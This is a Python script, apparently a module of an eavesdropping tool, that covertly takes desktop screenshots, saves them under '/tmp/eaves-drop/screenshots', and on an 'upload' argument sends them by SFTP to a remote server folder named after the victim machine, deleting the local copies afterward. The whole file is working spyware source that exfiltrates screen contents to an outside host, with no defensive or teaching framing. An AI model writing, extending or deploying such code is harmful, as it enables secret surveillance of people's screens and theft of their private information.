#!/usr/bin/env python3
import pyscreenshot as ImageGrab
from pathlib import Path
import system_info
from datetime import datetime, date
import connect
import os
import sys

remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))
remote_screenshots_dir = remote_dir / 'screenshots'
local_screenshots_dir = Path('/tmp/eaves-drop/screenshots')

local_screenshots_dir.mkdir(0o777, parents=True, exist_ok=True)


sftp_server = connect.connect()

if not sftp_server.exists(bytes(remote_screenshots_dir)):
    sftp_server.mkdir(bytes(remote_screenshots_dir))


def take_screenshot():
    filename = local_screenshots_dir / '{datetime}.png'.format(datetime=datetime.now().strftime('%Y%m%d%H%M'))
    image = ImageGrab.grab()
    image.save(filename)


def upload_screenshots():
    today = date.today()
    files = os.listdir(local_screenshots_dir)
    files = filter(lambda file: True if datetime.strptime(file[:8], '%Y%m%d').date() <= today else False, files)
    for file in files:
        local_file = local_screenshots_dir / file
        remote_file = remote_screenshots_dir / file

        if not sftp_server.exists(bytes(remote_file)):
            sftp_server.put(bytes(local_file), bytes(remote_file))
        os.unlink(local_file)


if __name__ == '__main__':
    take_screenshot()


if len(sys.argv) > 1:
    arg = sys.argv[1]
    if arg == 'upload':
        upload_screenshots()